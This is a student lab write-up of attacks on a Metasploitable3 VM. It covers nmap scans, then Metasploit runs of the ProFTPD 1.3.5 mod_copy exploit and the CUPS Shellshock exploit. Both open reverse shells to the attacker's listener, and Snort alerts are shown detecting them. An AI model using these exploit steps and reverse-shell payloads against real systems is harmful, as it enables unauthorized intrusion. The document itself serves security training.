# Cyberscecurity Project 2

First in the Metasploitable VM we will retrieve the IP and then we will initialize snort:

IP: `172.28.128.3`

Snort:

```bash
sudo snort -A console -u snort -g snort -c /etc/snort/snort.conf -i eth1 -k none
```

## Open Ports

Now we will do a nmap scan to see the open ports:

```bash
nmap -sV 172.28.128.3
```

```bash
Nmap scan report for 172.28.128.3
Host is up (0.00037s latency).
Not shown: 991 filtered ports
PORT     STATE  SERVICE     VERSION
21/tcp   open   ftp         ProFTPD 1.3.5
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open   http        Apache httpd 2.4.7
445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp  open   ipp         CUPS 1.7
3000/tcp closed ppp
3306/tcp open   mysql       MySQL (unauthorized)
8080/tcp open   http        Jetty 8.1.7.v20120910
8181/tcp closed intermapper
Service Info: Hosts: 127.0.2.1, METASPLOITABLE3-UB1404; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

We can perform a more in depth scan with the following command:

```bash
sudo nmap -n -sS -sV -sC 172.28.128.3 -p0-65535 -T4 -A -O
```

```bash
Starting Nmap 7.80 ( https://nmap.org ) at 2023-11-19 17:54 EET                                                                                                                               
Nmap scan report for 172.28.128.3                                                                                                                                                             
Host is up (0.00039s latency).                                                                                                                                                                
Not shown: 65525 filtered ports                                                                                                                                                               
PORT     STATE  SERVICE     VERSION                                                                                                                                                           
21/tcp   open   ftp         ProFTPD 1.3.5                                                                                                                                                     
22/tcp   open   ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)                                                                                                   
| ssh-hostkey:                                                                                                                                                                                
|   1024 2b:2e:1f:a4:54:26:87:76:12:26:59:58:0d:da:3b:04 (DSA)                                                                                                                                
|   2048 c9:ac:70:ef:f8:de:8b:a3:a3:44:ab:3d:32:0a:5c:6a (RSA)                                                                                                                                
|   256 c0:49:cc:18:7b:27:a4:07:0d:2a:0d:bb:42:4c:36:17 (ECDSA)                                                                                                                               
|_  256 a0:76:f3:76:f8:f0:70:4d:09:ca:e1:10:fd:a9:cc:0a (ED25519)                                                                                                                             
80/tcp   open   http        Apache httpd 2.4.7                                                                                                                                                
| http-ls: Volume /                                                                                                                                                                           
| SIZE  TIME              FILENAME                                                                                                                                                            
| -     2020-10-29 19:37  chat/                                                                                                                                                               
| -     2011-07-27 20:17  drupal/                                                                                                                                                             
| 1.7K  2020-10-29 19:37  payroll_app.php                                                                                                                                                     
| -     2013-04-08 12:06  phpmyadmin/                                                                                                                                                         
|_
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Index of /
445/tcp  open   netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
631/tcp  open   ipp         CUPS 1.7
| http-methods: 
|_  Potentially risky methods: PUT
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: CUPS/1.7 IPP/2.1
|_http-title: Home - CUPS 1.7.2
3000/tcp closed ppp
3306/tcp open   mysql       MySQL (unauthorized)
3500/tcp open   http        WEBrick httpd 1.3.1 (Ruby 2.3.8 (2018-10-18))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: WEBrick/1.3.1 (Ruby/2.3.8/2018-10-18)
|_http-title: Ruby on Rails: Welcome aboard
6697/tcp open   irc         UnrealIRCd
| irc-info: 
|   users: 1
|   servers: 1
|   lusers: 1
|   lservers: 0
|_  server: irc.TestIRC.net
8080/tcp open   http        Jetty 8.1.7.v20120910
|_http-server-header: Jetty(8.1.7.v20120910)
|_http-title: Error 404 - Not Found
8181/tcp closed intermapper
MAC Address: 08:00:27:E0:15:6B (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
Network Distance: 1 hop
Service Info: Hosts: 127.0.2.1, METASPLOITABLE3-UB1404, irc.TestIRC.net; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

With this new scan we can for example see that the port 3500 and 6697 open, and we can also see different files and folders.

## Identified Attack 1: ProFTPD

We can see that the port 21 is open with service **ftp** and version **ProFTPD 1.3.5**, so we perform a search on metasploit:

```bash
search proftpd
```

and we can see that:

```
Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/linux/misc/netsupport_manager_agent  2011-01-08       average    No     NetSupport Manager Agent Remote Buffer Overflow
   1  exploit/linux/ftp/proftp_sreplace            2006-11-26       great      Yes    ProFTPD 1.2 - 1.3.0 sreplace Buffer Overflow (Linux)
   2  exploit/freebsd/ftp/proftp_telnet_iac        2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (FreeBSD)
   3  exploit/linux/ftp/proftp_telnet_iac          2010-11-01       great      Yes    ProFTPD 1.3.2rc3 - 1.3.3b Telnet IAC Buffer Overflow (Linux)
   4  exploit/unix/ftp/proftpd_modcopy_exec        2015-04-22       excellent  Yes    ProFTPD 1.3.5 Mod_Copy Command Execution
   5  exploit/unix/ftp/proftpd_133c_backdoor       2010-12-02       excellent  No     ProFTPD-1.3.3c Backdoor Command Execution
```

We will use 4 since it has a excellent rank and its more recent than 5 and also matches the version of the service, we will also check the options of the exploit:

```bash
use 4
show options
```

And based on the output:

```bash
Module options (exploit/unix/ftp/proftpd_modcopy_exec):                                                                                                                                    
                                                                                                                                                                                           
   Name       Current Setting  Required  Description                                                                                                                                       
   ----       ---------------  --------  -----------
   CHOST                       no        The local client address
   CPORT                       no        The local client port
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT      80               yes       HTTP port (TCP)
   RPORT_FTP  21               yes       FTP port
   SITEPATH   /var/www         yes       Absolute writable website path
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /                yes       Base path to the website
   TMPPATH    /tmp             yes       Absolute writable path
   VHOST                       no        HTTP server virtual host


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.0.104    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port
```

```bash
set rhosts 172.28.128.3
set sitepath /var/www/html
```

Now we are going to try to run the exploit

```bash
exploit
```

```bash
[*] Started reverse TCP handler on 192.168.0.104:4444 
[*] 172.28.128.3:80 - 172.28.128.3:21 - Connected to FTP server
[*] 172.28.128.3:80 - 172.28.128.3:21 - Sending copy commands to FTP server
[*] 172.28.128.3:80 - Executing PHP payload /x7kh3w.php
[+] 172.28.128.3:80 - Deleted /var/www/html/x7kh3w.php
[*] Command shell session 1 opened (192.168.0.104:4444 -> 192.168.0.104:40142) at 2023-11-17 00:54:30 +0200
[-] 172.28.128.3:80 - Exploit aborted due to failure: unknown: 172.28.128.3:21 - Failure executing payload
[*] Exploit completed, but no session was created.
```

We can see that the exploit failed, we try to set the payload to a different one and then repeat

``` bash
set payload payload/cmd/unix/reverse_perl
exploit
```

```bash
[*] Started reverse TCP handler on 192.168.0.104:4444                                                                                                                                      
[*] 172.28.128.3:80 - 172.28.128.3:21 - Connected to FTP server                                                                                                                            
[*] 172.28.128.3:80 - 172.28.128.3:21 - Sending copy commands to FTP server                                                                                                                
[*] 172.28.128.3:80 - Executing PHP payload /TWmEi.php                                                                                                                                     
[+] 172.28.128.3:80 - Deleted /var/www/html/TWmEi.php                                                                                                                                      
[*] Command shell session 3 opened (192.168.0.104:4444 -> 192.168.0.104:46438) at 2023-11-17 01:03:35 +0200  
```

Now we can see that the attack worked successfuly and we have a shell that we can use.

Also we can see that the attack was detected by snort as a priority 1 attack:

```bash
11/16-16:31:14.340657  [**] [1:1356:5] WEB-ATTACKS perl execution attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:40327 -> 172.28.128.3:80
```

## Identified Attack 2: CUPS

We can see that the port 631 is open with service **ipp** and version **CUPS 1.7**, so we perform a search on metasploit:

we must add vagrant to the group lpadmin to be able to use the exploit because it needs to add a printer:

```bash
sudo usermod -a -G lpadmin vagrant
```

We search for cups exploits:

```bash
search cups
```

```bash
Matching Modules
================

   #  Name                                     Disclosure Date  Rank       Check  Description
   -  ----                                     ---------------  ----       -----  -----------
   0  post/multi/escalate/cups_root_file_read  2012-11-20       normal     No     CUPS 1.6.1 Root File Read
   1  exploit/multi/http/cups_bash_env_exec    2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)
```

We decide to use 1 since it has a excellent rank and its more recent than 0, we will also check the options of the exploit:

```bash
use 1
show options
```

```bash
Module options (exploit/multi/http/cups_bash_env_exec):

   Name          Current Setting  Required  Description
   ----          ---------------  --------  -----------
   CVE           CVE-2014-6271    yes       CVE to exploit (Accepted: CVE-2014-6271, CVE-2014-6278)
   HttpPassword                   yes       CUPS user password
   HttpUsername  root             yes       CUPS username
   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                         yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPATH         /bin             yes       Target PATH for binaries
   RPORT         631              yes       The target port (TCP)
   SSL           true             yes       Use SSL
   VHOST                          no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
```

```bash
set RHOSTS 172.28.128.3
set httppassword vagrant
set httpusername vagrant
set LHOST 172.16.216.1
```

Then we configure the payload:

```bash
show payloads
```

```bash
Compatible Payloads
===================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  payload/cmd/unix/adduser                            normal  No     Add user with useradd
   1  payload/cmd/unix/bind_ruby                          normal  No     Unix Command Shell, Bind TCP (via Ruby)
   2  payload/cmd/unix/bind_ruby_ipv6                     normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
   3  payload/cmd/unix/generic                            normal  No     Unix Command, Generic Command Execution
   4  payload/cmd/unix/reverse_ruby                       normal  No     Unix Command Shell, Reverse TCP (via Ruby)
   5  payload/cmd/unix/reverse_ruby_ssl                   normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
```

And select the number 5:

```bash
set payload 5
```

We run the exploit

```bash
exploit
```

And get:

```bash
[-] Handler failed to bind to 172.16.216.1:4444
[-] Handler failed to bind to 0.0.0.0:4444
[-] Exploit failed [bad-config]: Rex::BindFailed The address is already in use or unavailable: (0.0.0.0:4444).
[*] Exploit completed, but no session was created.
```

This is because the LHOST is not correctly set

```bash
set LHOST 192.168.0.104
exploit
```

```bash
[*] Started reverse SSL handler on 192.168.0.104:4444 
[+] Added printer successfully
[+] Deleted printer 'txAKL9H0dP' successfully
[*] Command shell session 1 opened (192.168.0.104:4444 -> 192.168.0.104:34270) at 2023-11-19 16:58:02 +0200

[*] 172.28.128.3 - Command shell session 1 closed.
```

We manage to get a shell but it closes immediately, we can see that the exploit is not stable, we tried with other payloads but we get the same result.

We can also see that the attack was detected by snort as a priority 1 attack:

```bash
11/19-15:01:03.079051  [**] [1:1768:7] WEB-IIS header field buffer overflow attempt [**] [Classification: Web Application Attack] [Priority: 1] {TCP} 172.28.128.1:44957 -> 172.28.128.3:631
```

## 
